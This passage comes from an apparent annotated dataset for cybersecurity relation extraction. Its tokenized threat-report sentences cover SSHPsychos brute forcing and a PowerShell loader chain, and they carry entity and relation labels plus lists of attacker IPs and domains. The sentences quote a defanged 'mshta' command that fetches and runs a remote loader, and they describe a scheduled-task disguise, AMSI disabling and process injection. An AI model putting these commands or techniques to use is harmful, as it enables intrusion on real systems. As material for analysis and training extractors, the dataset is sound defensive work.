"SSHPsychos", "suddenly", "pivoted", "."], ["The", "original", "/23", "network", "went", "from", "a", "huge", "volume", "of", "SSH", "brute", "force", "attempts", "to", "almost", "no", "activity", "and", "a", "new", "/23", "network", "began", "large", "amounts", "of", "SSH", "brute", "forcing", "following", "the", "exact", "same", "behavior", "associated", "with", "SSHPsychos", "."], ["The", "host", "serving", "the", "malware", "also", "changed", "and", "a", "new", "host", "(", "23.234.19.202", ")", "was", "seen", "providing", "the", "same", "file", "as", "discussed", "before", "a", "DDoS", "Rootkit", "."], ["SSHPsychos", "SSH", "Traffic", "(", "103.41.124.0/23", "-", "Red", "&", "Pink", ",", "43.255.190.0/23", "-", "Orange", ",", "All", "Other", "SSH", "Traffic", "-", "Green", ")", "Based", "on", "this", "sudden", "shift", ",", "immediate", "action", "was", "taken", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "file", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "IP addresses", "pos": [9, 11], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [24, 24], "name": "23.234.60.140", "pos": [24, 25], "index": "2_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [38, 38], "name": "additional instructions", "pos": [11, 13], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "XOR encoded file", "pos": [17, 20], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [51, 51], "name": "C2 servers", "pos": [24, 26], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [75, 75], "name": "behavior", "pos": [4, 5], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [91, 91], "name": "103.41.124.0/23", "pos": [20, 21], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [96, 96], "name": "SSHPsychos", "pos": [3, 4], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [110, 110], "name": "SSH", "pos": [10, 11], "index": "9_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [127, 127], "name": "SSH", "pos": [27, 28], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [137, 137], "name": "SSHPsychos", "pos": [37, 38], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [143, 143], "name": "malware", "pos": [4, 5], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [151, 151], "name": "23.234.19.202", "pos": [12, 13], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [163, 163], "name": "DDoS Rootkit", "pos": [24, 26], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [166, 166], "name": "SSHPsychos", "pos": [0, 1], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [170, 170], "name": "103.41.124.0/23", "pos": [4, 5], "index": "16_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [176, 176], "name": "43.255.190.0/23", "pos": [10, 11], "index": "17_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [0, 1, 2, 3], "t": 0, "h": 6}, {"r": "EX", "evidence": [0, 1, 2, 3], "t": 0, "h": 6}, {"r": "RD", "evidence": [1, 2, 3], "t": 3, "h": 6}, {"r": "RD", "evidence": [1, 2, 3], "t": 3, "h": 6}, {"r": "WR", "evidence": [1, 2, 3], "t": 3, "h": 6}, {"r": "ST", "evidence": [1, 2, 3], "t": 5, "h": 6}, {"r": "ST", "evidence": [1, 2, 3], "t": 5, "h": 6}, {"r": "ST", "evidence": [1, 2, 3], "t": 5, "h": 6}, {"r": "ST", "evidence": [1, 2, 3], "t": 5, "h": 6}, {"r": "RF", "evidence": [1, 2, 3], "t": 5, "h": 6}, {"r": "ST", "evidence": [3], "h": 6, "t": 7}, {"r": "RF", "evidence": [3], "h": 6, "t": 7}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "ST", "evidence": [3, 4, 5], "t": 7, "h": 9}, {"r": "RF", "evidence": [3, 4, 5], "t": 7, "h": 9}, {"r": "ST", "evidence": [3, 4, 5], "t": 7, "h": 9}, {"r": "RF", "evidence": [3, 4, 5], "t": 7, "h": 9}, {"r": "FR", "evidence": [5], "h": 10, "t": 11}, {"r": "ST", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "RF", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "CO", "evidence": [5], "h": 9, "t": 10}, {"r": "UK", "evidence": [4, 5, 6], "t": 8, "h": 12}, {"r": "ST", "evidence": [6], "h": 12, "t": 13}, {"r": "RF", "evidence": [6], "h": 12, "t": 13}, {"r": "WR", "evidence": [6], "h": 12, "t": 14}]}, {"title": "665-7", "sents": [["Domain", "Information", "for", "Server", "Hosting", "DDoS", "KitOnce", "the", "rootkit", "is", "installed", "additional", "instructions", "are", "downloaded", "via", "an", "XOR", "encoded", "file", "from", "one", "of", "the", "C2", "servers", "."], ["Level", "3", "decoded", "one", "of", "the", "configuration", "files", "a", "sample", "of", "which", "can", "be", "found", "below", "."], ["Level", "3", "analyzed", "the", "behavior", "of", "the", "suspect", "networks", "and", "confirmed", "that", "no", "legitimate", "traffic", "is", "originating", "or", "destined", "for", "103.41.124.0/23", "."], ["On", "March", "30th", "SSHPsychos", "suddenly", "pivoted", "."], ["The", "original", "/23", "network", "went", "from", "a", "huge", "volume", "of", "SSH", "brute", "force", "attempts", "to", "almost", "no", "activity", "and", "a", "new", "/23", "network", "began", "large", "amounts", "of", "SSH", "brute", "forcing", "following", "the", "exact", "same", "behavior", "associated", "with", "SSHPsychos", "."], ["The", "host", "serving", "the", "malware", "also", "changed", "and", "a", "new", "host", "(", "23.234.19.202", ")", "was", "seen", "providing", "the", "same", "file", "as", "discussed", "before", "a", "DDoS", "Rootkit", "."], ["SSHPsychos", "SSH", "Traffic", "(", "103.41.124.0/23", "-", "Red", "&", "Pink", ",", "43.255.190.0/23", "-", "Orange", ",", "All", "Other", "SSH", "Traffic", "-", "Green", ")", "Based", "on", "this", "sudden", "shift", ",", "immediate", "action", "was", "taken", "."], ["Talos", "and", "Level", "3", "decided", "to", "remove", "the", "routing", "capabilities", "for", "103.41.124.0/23", ",", "but", "also", "add", "the", "new", "netblock", "43.255.190.0/23", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [11, 11], "name": "additional instructions", "pos": [11, 13], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "XOR encoded file", "pos": [17, 20], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [24, 24], "name": "C2 servers", "pos": [24, 26], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "behavior", "pos": [4, 5], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [64, 64], "name": "103.41.124.0/23", "pos": [20, 21], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "SSHPsychos", "pos": [3, 4], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [83, 83], "name": "SSH", "pos": [10, 11], "index": "6_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [100, 100], "name": "SSH", "pos": [27, 28], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [110, 110], "name": "SSHPsychos", "pos": [37, 38], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [116, 116], "name": "malware", "pos": [4, 5], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [124, 124], "name": "23.234.19.202", "pos": [12, 13], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [136, 136], "name": "DDoS Rootkit", "pos": [24, 26], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [139, 139], "name": "SSHPsychos", "pos": [0, 1], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [143, 143], "name": "103.41.124.0/23", "pos": [4, 5], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [149, 149], "name": "43.255.190.0/23", "pos": [10, 11], "index": "14_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [182, 182], "name": "103.41.124.0/23", "pos": [11, 12], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [190, 190], "name": "43.255.190.0/23", "pos": [19, 20], "index": "16_0"}]], "labels": [{"r": "RD", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "RD", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "ST", "evidence": [0, 1, 2], "t": 2, "h": 3}, {"r": "ST", "evidence": [0, 1, 2], "t": 2, "h": 3}, {"r": "ST", "evidence": [0, 1, 2], "t": 2, "h": 3}, {"r": "ST", "evidence": [0, 1, 2], "t": 2, "h": 3}, {"r": "RF", "evidence": [0, 1, 2], "t": 2, "h": 3}, {"r": "ST", "evidence": [2], "h": 3, "t": 4}, {"r": "RF", "evidence": [2], "h": 3, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "ST", "evidence": [2, 3, 4], "t": 4, "h": 6}, {"r": "RF", "evidence": [2, 3, 4], "t": 4, "h": 6}, {"r": "ST", "evidence": [2, 3, 4], "t": 4, "h": 6}, {"r": "RF", "evidence": [2, 3, 4], "t": 4, "h": 6}, {"r": "FR", "evidence": [4], "h": 7, "t": 8}, {"r": "ST", "evidence": [4, 5], "h": 8, "t": 10}, {"r": "RF", "evidence": [4, 5], "h": 8, "t": 10}, {"r": "CO", "evidence": [4], "h": 6, "t": 7}, {"r": "UK", "evidence": [3, 4, 5], "t": 5, "h": 9}, {"r": "ST", "evidence": [5], "h": 9, "t": 10}, {"r": "RF", "evidence": [5], "h": 9, "t": 10}, {"r": "WR", "evidence": [5], "h": 9, "t": 11}]}, {"title": "665-8", "sents": [["Level", "3", "decoded", "one", "of", "the", "configuration", "files", "a", "sample", "of", "which", "can", "be", "found", "below", "."], ["Level", "3", "analyzed", "the", "behavior", "of", "the", "suspect", "networks", "and", "confirmed", "that", "no", "legitimate", "traffic", "is", "originating", "or", "destined", "for", "103.41.124.0/23", "."], ["On", "March", "30th", "SSHPsychos", "suddenly", "pivoted", "."], ["The", "original", "/23", "network", "went", "from", "a", "huge", "volume", "of", "SSH", "brute", "force", "attempts", "to", "almost", "no", "activity", "and", "a", "new", "/23", "network", "began", "large", "amounts", "of", "SSH", "brute", "forcing", "following", "the", "exact", "same", "behavior", "associated", "with", "SSHPsychos", "."], ["The", "host", "serving", "the", "malware", "also", "changed", "and", "a", "new", "host", "(", "23.234.19.202", ")", "was", "seen", "providing", "the", "same", "file", "as", "discussed", "before", "a", "DDoS", "Rootkit", "."], ["SSHPsychos", "SSH", "Traffic", "(", "103.41.124.0/23", "-", "Red", "&", "Pink", ",", "43.255.190.0/23", "-", "Orange", ",", "All", "Other", "SSH", "Traffic", "-", "Green", ")", "Based", "on", "this", "sudden", "shift", ",", "immediate", "action", "was", "taken", "."], ["Talos", "and", "Level", "3", "decided", "to", "remove", "the", "routing", "capabilities", "for", "103.41.124.0/23", ",", "but", "also", "add", "the", "new", "netblock", "43.255.190.0/23", "."], ["IOCDomains", ":", "ftp.rxxiaoao.com", "ndns.dsaj2a.org", "ndns.dsaj2a1.org", "ndns.hcxiaoao.com", "ndns.dsaj2a.com", "ns1.hostasa.org", "ns2.hostasa.org", "ns3.hostasa.org", "ns4.hostasa.org", "aa.hostasa.org", "info.3000uc.orgIP", "Addresses", ":", "Scanning", ":", "103.41.124.0/23", "&", "Control", ":", "103.240.140.152", "103.240.141.54", "103.240.141.50", "104.143.5.25", "162.218.112.7Malware", "Hosting", ":", "23.234.60.140", "23.234.60.143", "23.234.19.202SSH", "Password", "ListRootkit", "Config", "File", "SampleConclusionGone", "are", "the", "days", "when", "detectors", "and", "protectors", "can", "sit", "on", "the", "Int"]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "behavior", "pos": [4, 5], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [37, 37], "name": "103.41.124.0/23", "pos": [20, 21], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "SSHPsychos", "pos": [3, 4], "index": "2_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [56, 56], "name": "SSH", "pos": [10, 11], "index": "3_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [73, 73], "name": "SSH", "pos": [27, 28], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [83, 83], "name": "SSHPsychos", "pos": [37, 38], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "malware", "pos": [4, 5], "index": "6_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [97, 97], "name": "23.234.19.202", "pos": [12, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [109, 109], "name": "DDoS Rootkit", "pos": [24, 26], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [112, 112], "name": "SSHPsychos", "pos": [0, 1], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [116, 116], "name": "103.41.124.0/23", "pos": [4, 5], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [122, 122], "name": "43.255.190.0/23", "pos": [10, 11], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [155, 155], "name": "103.41.124.0/23", "pos": [11, 12], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [163, 163], "name": "43.255.190.0/23", "pos": [19, 20], "index": "13_0"}]], "labels": [{"r": "ST", "evidence": [1], "h": 0, "t": 1}, {"r": "RF", "evidence": [1], "h": 0, "t": 1}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 2}, {"r": "ST", "evidence": [1, 2, 3], "t": 1, "h": 3}, {"r": "RF", "evidence": [1, 2, 3], "t": 1, "h": 3}, {"r": "ST", "evidence": [1, 2, 3], "t": 1, "h": 3}, {"r": "RF", "evidence": [1, 2, 3], "t": 1, "h": 3}, {"r": "FR", "evidence": [3], "h": 4, "t": 5}, {"r": "ST", "evidence": [3, 4], "h": 5, "t": 7}, {"r": "RF", "evidence": [3, 4], "h": 5, "t": 7}, {"r": "CO", "evidence": [3], "h": 3, "t": 4}, {"r": "UK", "evidence": [2, 3, 4], "t": 2, "h": 6}, {"r": "ST", "evidence": [4], "h": 6, "t": 7}, {"r": "RF", "evidence": [4], "h": 6, "t": 7}, {"r": "WR", "evidence": [4], "h": 6, "t": 8}]}, {"title": "05_g02-0", "sents": [["he", "system", "was", "found", "to", "have", "executed", "a", "command", "."], ["The", "IP", "address", "31.41.244.231", "is", "Russian", "and", "hosts", "several", "similarly", "named", "URLs", "."], ["The", "first", "command", "downloads", "an", "HTA", "application", "with", "encrypted", "VB", "script", "code", "."], ["When", "opened", "in", "a", "browser", ",", "the", "HTA", "file", "displays", "content", "."], ["Once", "deobfuscated", ",", "the", "HTA", "file", "executes", "the", "VB", "script", "code", "to", "download", "and", "run", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "which", "launches", "the", "next", "stage", "of", "the", "loading", "process", "."], ["The", "autorunnn.exe", "module", "is", "a", "SharpHide", "variant", "that", "creates", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["The", "program", "also", "creates", "a", "scheduled", "task", "named", "``", "OneDrive", "Standalone", "Update", "Task", "''", "that", "runs", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "modified", "SharpHide", "code", "hides", "the", "registry", "startup", "entry", "."]], "vertexSet": [[{"type": "SO", "sent_id": 1, "global_pos": [13, 13], "name": "31.41.244.231", "pos": [3, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [24, 24], "name": "first command", "pos": [1, 3], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [28, 28], "name": "HTA application", "pos": [5, 7], "index": "2_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [40, 40], "name": "browser", "pos": [4, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [43, 43], "name": "HTA", "pos": [7, 8], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [52, 52], "name": "HTA", "pos": [4, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [56, 56], "name": "VB script", "pos": [8, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [63, 63], "name": "PowerShell code", "pos": [15, 17], "index": "7_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [66, 66], "name": "hxxp : //31.41.244.231/0x ? 0=Loader", "pos": [18, 23], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [79, 79], "name": "loading process", "pos": [31, 33], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [83, 83], "name": "autorunnn.exe", "pos": [1, 2], "index": "10_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [96, 96], "name": "registry", "pos": [14, 15], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [112, 112], "name": "program", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [135, 135], "name": "PowerShell loader", "pos": [24, 26], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [140, 140], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "14_0"}]], "labels": [{"r": "ST", "evidence": [1, 2], "t": 0, "h": 1}, {"r": "RF", "evidence": [1, 2], "t": 0, "h": 1}, {"r": "WR", "evidence": [2], "h": 1, "t": 2}, {"r": "FR", "evidence": [2, 3], "h": 1, "t": 3}, {"r": "FR", "evidence": [3], "h": 3, "t": 4}, {"r": "CO", "evidence": [3, 4], "h": 4, "t": 5}, {"r": "EX", "evidence": [4], "h": 5, "t": 6}, {"r": "FR", "evidence": [4], "h": 5, "t": 7}, {"r": "RF", "evidence": [4], "h": 5, "t": 8}, {"r": "FR", "evidence": [4], "h": 5, "t": 9}, {"r": "RD", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 9, "t": 10}, {"r": "CO", "evidence": [4, 5, 6], "h": 9, "t": 12}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "WR", "evidence": [6], "h": 12, "t": 13}, {"r": "RF", "evidence": [6], "h": 12, "t": 14}]}, {"title": "05_g02-1", "sents": [["The", "IP", "address", "31.41.244.231", "is", "Russian", "and", "hosts", "several", "similarly", "named", "URLs", "."], ["The", "first", "command", "downloads", "an", "HTA", "application", "with", "encrypted", "VB", "script", "code", "."], ["When", "opened", "in", "a", "browser", ",", "the", "HTA", "file", "displays", "content", "."], ["Once", "deobfuscated", ",", "the", "HTA", "file", "executes", "the", "VB", "script", "code", "to", "download", "and", "run", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "which", "launches", "the", "next", "stage", "of", "the", "loading", "process", "."], ["The", "autorunnn.exe", "module", "is", "a", "SharpHide", "variant", "that", "creates", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["The", "program", "also", "creates", "a", "scheduled", "task", "named", "``", "OneDrive", "Standalone", "Update", "Task", "''", "that", "runs", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "modified", "SharpHide", "code", "hides", "the", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "that", "will", "be", "executed", "on", "the", "system", "as", "part", "of", "the", "logon", "sequence", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [3, 3], "name": "31.41.244.231", "pos": [3, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [14, 14], "name": "first command", "pos": [1, 3], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [18, 18], "name": "HTA application", "pos": [5, 7], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [30, 30], "name": "browser", "pos": [4, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [33, 33], "name": "HTA", "pos": [7, 8], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [42, 42], "name": "HTA", "pos": [4, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [46, 46], "name": "VB script", "pos": [8, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [53, 53], "name": "PowerShell code", "pos": [15, 17], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [56, 56], "name": "hxxp : //31.41.244.231/0x ? 0=Loader", "pos": [18, 23], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "loading process", "pos": [31, 33], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [73, 73], "name": "autorunnn.exe", "pos": [1, 2], "index": "10_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [86, 86], "name": "registry", "pos": [14, 15], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [102, 102], "name": "program", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [125, 125], "name": "PowerShell loader", "pos": [24, 26], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [130, 130], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "14_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [150, 150], "name": "PowerShell", "pos": [3, 4], "index": "15_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RF", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "FR", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "FR", "evidence": [2], "h": 3, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "EX", "evidence": [3], "h": 5, "t": 6}, {"r": "FR", "evidence": [3], "h": 5, "t": 7}, {"r": "RF", "evidence": [3], "h": 5, "t": 8}, {"r": "FR", "evidence": [3], "h": 5, "t": 9}, {"r": "RD", "evidence": [3, 4], "h": 9, "t": 11}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 10}, {"r": "CO", "evidence": [3, 4, 5], "h": 9, "t": 12}, {"r": "WR", "evidence": [4], "h": 10, "t": 11}, {"r": "WR", "evidence": [5], "h": 12, "t": 13}, {"r": "RF", "evidence": [5], "h": 12, "t": 14}, {"r": "FR", "evidence": [5, 6, 7], "h": 12, "t": 15}, {"r": "EX", "evidence": [5, 6, 7], "t": 13, "h": 15}]}, {"title": "05_g02-2", "sents": [["The", "first", "command", "downloads", "an", "HTA", "application", "with", "encrypted", "VB", "script", "code", "."], ["When", "opened", "in", "a", "browser", ",", "the", "HTA", "file", "displays", "content", "."], ["Once", "deobfuscated", ",", "the", "HTA", "file", "executes", "the", "VB", "script", "code", "to", "download", "and", "run", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "which", "launches", "the", "next", "stage", "of", "the", "loading", "process", "."], ["The", "autorunnn.exe", "module", "is", "a", "SharpHide", "variant", "that", "creates", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["The", "program", "also", "creates", "a", "scheduled", "task", "named", "``", "OneDrive", "Standalone", "Update", "Task", "''", "that", "runs", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "modified", "SharpHide", "code", "hides", "the", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "that", "will", "be", "executed", "on", "the", "system", "as", "part", "of", "the", "logon", "sequence", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "which", "contains", "three", "embedded", "modules", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "first command", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "HTA application", "pos": [5, 7], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [17, 17], "name": "browser", "pos": [4, 5], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "HTA", "pos": [7, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [29, 29], "name": "HTA", "pos": [4, 5], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [33, 33], "name": "VB script", "pos": [8, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [40, 40], "name": "PowerShell code", "pos": [15, 17], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [43, 43], "name": "hxxp : //31.41.244.231/0x ? 0=Loader", "pos": [18, 23], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "loading process", "pos": [31, 33], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [60, 60], "name": "autorunnn.exe", "pos": [1, 2], "index": "9_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [73, 73], "name": "registry", "pos": [14, 15], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "program", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [112, 112], "name": "PowerShell loader", "pos": [24, 26], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [117, 117], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "13_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [137, 137], "name": "PowerShell", "pos": [3, 4], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [158, 158], "name": "PowerShell loader", "pos": [5, 7], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [174, 174], "name": "PowerShell process", "pos": [21, 23], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "EX", "evidence": [2], "h": 4, "t": 5}, {"r": "FR", "evidence": [2], "h": 4, "t": 6}, {"r": "RF", "evidence": [2], "h": 4, "t": 7}, {"r": "FR", "evidence": [2], "h": 4, "t": 8}, {"r": "RD", "evidence": [2, 3], "h": 8, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "CO", "evidence": [2, 3, 4], "h": 8, "t": 11}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [4], "h": 11, "t": 12}, {"r": "RF", "evidence": [4], "h": 11, "t": 13}, {"r": "FR", "evidence": [4, 5, 6], "h": 11, "t": 14}, {"r": "EX", "evidence": [4, 5, 6], "t": 12, "h": 14}, {"r": "FR", "evidence": [6, 7], "h": 14, "t": 16}, {"r": "CO", "evidence": [6, 7], "h": 14, "t": 15}]}, {"title": "05_g02-3", "sents": [["When", "opened", "in", "a", "browser", ",", "the", "HTA", "file", "displays", "content", "."], ["Once", "deobfuscated", ",", "the", "HTA", "file", "executes", "the", "VB", "script", "code", "to", "download", "and", "run", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "which", "launches", "the", "next", "stage", "of", "the", "loading", "process", "."], ["The", "autorunnn.exe", "module", "is", "a", "SharpHide", "variant", "that", "creates", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["The", "program", "also", "creates", "a", "scheduled", "task", "named", "``", "OneDrive", "Standalone", "Update", "Task", "''", "that", "runs", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "modified", "SharpHide", "code", "hides", "the", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "that", "will", "be", "executed", "on", "the", "system", "as", "part", "of", "the", "logon", "sequence", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "which", "contains", "three", "embedded", "modules", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "first", "module", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [4, 4], "name": "browser", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", 